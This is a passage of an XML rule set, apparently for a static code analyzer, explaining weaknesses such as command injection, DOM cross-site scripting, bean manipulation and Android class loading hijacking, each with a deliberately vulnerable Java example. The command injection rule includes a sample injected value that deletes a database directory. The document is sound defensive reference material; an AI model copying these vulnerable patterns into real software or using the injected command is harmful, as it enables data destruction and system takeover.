			Practices/Missing URL Parameter Converter
		</internalKey>
		<name>ADF Bad Practices: Missing URL Parameter Converter</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An Oracle ADF Faces bookmarkable view is missing a URL parameter converter.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In a regular JSF application, values are converted and validated using converters and validators specified by the UI components. The conversion and validation itself happens when the page is submitted. A bookmarkable view in a Fusion application results in no page submission, and therefore no similar conversion or validation is performed by default.<br><br><b>Example 1:</b> The following configuration file snippet shows a sample bookmarkable view that is configured to perform no conversion or validation of the <code>paramName</code> URL parameter.<br><br><pre><br>...<br>    &lt;bookmark&gt;<br>        &lt;method&gt;#{paramHandler.handleParams}&lt;/method&gt;<br>        &lt;url-parameter&gt;<br>            &lt;name&gt;paramName&lt;/name&gt;<br>            &lt;value&gt;#{requestScope.paramName}&lt;/value&gt;<br>        &lt;/url-parameter&gt;<br>    &lt;/bookmark&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12]  <em>Oracle(R) Fusion Middleware Fusion Developer's Guide for Oracle Application Development Framework, 15.2.3.Bookmarking View Activities</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_access_specifier_manipulation
		</key>
		<internalKey>Input Validation and Representation/Access Specifier
			Manipulation
		</internalKey>
		<name>Access Specifier Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method call changes an access specifier.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The AccessibleObject API allows the programmer to get around the access control checks provided by Java access specifiers.  In particular it enables the programmer to allow a reflected object to bypass Java access controls and in turn change the value of private fields or invoke private methods, behaviors that are normally disallowed.<br>  
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 284</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 676</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_android_class_loading_hijacking
		</key>
		<internalKey>Input Validation and Representation/Android Class Loading
			Hijacking
		</internalKey>
		<name>Android Class Loading Hijacking</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Loading classes from an untrusted source or in an untrusted environment can cause an application to execute malicious commands on behalf of an attacker. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Android Class Loading Hijacking vulnerabilities take two forms:<br><br>- An attacker can change the name of the directories that the program searches to load classes, thereby pointing the path to one that they have control over: the attacker explicitly controls the paths which should be searched for classes.<br><br>- An attacker can change the environment in which the class loads: the attacker implicitly controls what the path name means.<br><br>In this case we are primarily concerned with the second scenario, the possibility that an attacker may be able to control the environment. Android Class Loading Hijacking vulnerabilities of this type occur when:<br><br>A path is searched for libraries either without using an absolute path, or without verifying the classes that could be loaded.<br><br><b>Example 1:</b> The following code specifies a directory to load classes but does not validate what classes may reside within that directory.<br><br><pre><br>...<br>  DexClassLoader dexClassLoader = new DexClassLoader(myPath, optimizedDexOutputPath.getAbsolutePath(), null, getClassLoader());<br>  ...<br></pre><br><br>This code simply specifies to look for DEX files to interpret. This means that if they have control over the environment where <code>myPath</code> points, they could get a malicious DEX file interpreted to potentially gain control of the system.<br><br><b>Example 2:</b> The following code specifies an output directory that is potentially world-readable and world-writable by applications with the <code>WRITE_EXTERNAL_STORAGE</code> permission.<br><br><pre><br>...<br>  DexClassLoader dexClassLoader = new DexClassLoader(absolutePath, Environment.getExternalStorageDirectory(), null, getClassLoader());<br>...<br></pre><br><br>This code specifies an output directory of <code>Environment.getExternalStorageDirectory()</code>, which often points to the external SD card for an Android device. This is world-readable and world-writable for apps with the permission <code>WRITE_EXTERNAL_STORAGE</code> meaning that if there is an attacker who has gained this privilege, or a malicious app with this privilege, they would be able to replace the outputted Optimized DEX file (ODEX) with a malicious version and have their code executed with the same permissions as the original application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5]  <em>Android Class Loading Hijacking</em> Symantec<br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 114</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_bean_manipulation</key>
		<internalKey>Input Validation and Representation/Bean Manipulation
		</internalKey>
		<name>Bean Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An attacker can set arbitrary bean properties that can compromise system integrity.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Bean property names and values need to be validated before populating any bean. Bean population functions allow to set a bean property or a nested property. An attacker can leverage this functionality to access special bean properties like <code>class.classLoader</code> that will allow him to override system properties and potentially execute arbitrary code.<br><br><b>Example:</b> The following code sets a user-controlled bean property without proper validation of the property name or value:<br><br><pre><br>String prop = request.getParameter('prop');<br>String value = request.getParameter('value');<br>HashMap properties = new HashMap();<br>properties.put(prop, value);<br>BeanUtils.populate(user, properties);<br></pre><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 15</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_command_injection</key>
		<internalKey>Input Validation and Representation/Command Injection
		</internalKey>
		<name>Command Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing commands from an untrusted source or in an untrusted environment can cause an application to execute malicious commands on behalf of an attacker.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Command injection vulnerabilities take two forms:<br><br>- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.<br><br>- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.<br><br>In this case we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:<br><br>1. Data enters the application from an untrusted source.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2. The data is used as or as part of a string representing a command that is executed by the application.<br><br>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.<br><br><b>Example 1:</b> The following code from a system utility uses the system property <code>APPHOME</code> to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.<br><br><pre><br>	...<br>	String home = System.getProperty("APPHOME");<br>	String cmd = home + INITCMD;<br>	java.lang.Runtime.getRuntime().exec(cmd);<br>	...<br></pre><br><br>The code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property <code>APPHOME</code> to point to a different path containing a malicious version of <code>INITCMD</code>. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property <code>APPHOME</code>, then they can fool the application into running malicious code and take control of the system.<br><br><b>Example 2:</b> The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the <code>rman</code> utility and then run a <code>cleanup.bat</code> script to delete some temporary files. The script <code>rmanDB.bat</code> accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.<br><br><pre><br>...<br>String btype = request.getParameter("backuptype");<br>String cmd = new String("cmd.exe /K<br>\"c:\\util\\rmanDB.bat "+btype+"&amp;&amp;c:\\util\\cleanup.bat\"")<br>System.Runtime.getRuntime().exec(cmd);<br>...<br></pre><br><br>The problem here is that the program does not do any validation on the <code>backuptype</code> parameter read from the user. Typically the <code>Runtime.exec()</code> function will not execute multiple commands, but in this case the program first runs the <code>cmd.exe</code> shell in order to run multiple commands with a single call to <code>Runtime.exec()</code>. Once the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form <code>"&amp;&amp; del c:\\dbms\\*.*"</code>, then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.<br><br><b>Example 3:</b> The following code is from a web application that allows users access to an interface through which they can update their password on the system. Part of the process for updating passwords in certain network environments is to run a <code>make</code> command in the <code>/var/yp</code> directory, the code for which is shown below.<br><br><pre><br>...<br>System.Runtime.getRuntime().exec("make");<br>...<br></pre><br><br>The problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to <code>Runtime.exec()</code>. If an attacker can modify the <code>$PATH</code> variable to point to a malicious binary called <code>make</code> and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's <code>make</code> will now be run with these privileges, possibly giving the attacker complete control of the system.<br><br>Some think that in the mobile world, classic vulnerabilities, such as command injection, do not make sense -- why would a user attack him or herself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 4:</b> The following code reads commands to be executed from an Android intent.<br><br><pre><br>...<br>        String[] cmds = this.getIntent().getStringArrayExtra("commands");<br>        Process p = Runtime.getRuntime().exec("su");<br>        DataOutputStream os = new DataOutputStream(p.getOutputStream());<br>        for (String cmd : cmds) {<br>                os.writeBytes(cmd+"\n");<br>        }<br>        os.writeBytes("exit\n");<br>        os.flush();<br>...<br></pre><br><br>On a rooted device, a malicious application can force a victim application to execute arbitrary commands with super user privileges.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 77, CWE ID 78</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>OS Commanding</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_dom
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/DOM
		</internalKey>
		<name>Cross-Site Scripting: DOM</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of DOM-based XSS, data is read from a URL parameter or other value within the browser and written back into the page with client-side code. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated. In the case of DOM Based XSS, malicious content gets executed as part of DOM (Document Object Model) creation, whenever the victim's browser parses the HTML page.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><b>Example:</b> The following JavaScript code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user.<br><br><pre><br>String queryString = Window.Location.getQueryString();<br>int pos = queryString.indexOf("eid=")+4;<br>HTML output = new HTML();<br>output.setHTML(queryString.substring(pos, queryString.length()));<br></pre><br><br>The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br>As the example demonstrates, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- Data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- The application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[12]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[23]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_cross_site_scripting_external_links
		</key>
		<internalKey>Input Validation and Representation/Cross-Site
			Scripting/External Links
		</internalKey>
		<name>Cross-Site Scripting: External Links</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code. Settings in the configuration can minimize and reduce the exposure to cross-site scripting
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source, most frequently a web request or database.<br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br>Since attacks against XSS vulnerabilities often involve communicating with or redirecting to a malicious site controlled by the attacker, the ability to inject references to content on other domains is integral to many exploits. AntiSamy can be configured to prevent links to external domains, which diminishes the damage an attacker can cause through an XSS attack. However, this protection is only a partial solution and does not address the overall threat posed by XSS vulnerabilities.<br><br><b>Example 1:</b> The following AntiSamy configuration entry allows links to URLs outside of the domain on which the application is running.<br><pre><br>		&lt;attribute name="href" onInvalid="filterTag"&gt;<br>			&lt;regexp-list&gt;<br>				&lt;regexp name="onsiteURL"/&gt;<br>				&lt;regexp name="offsiteURL"/&gt;<br>			&lt;/regexp-list&gt;<br>		&lt;/attribute&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting, Content Spoofing</em> <br></p>
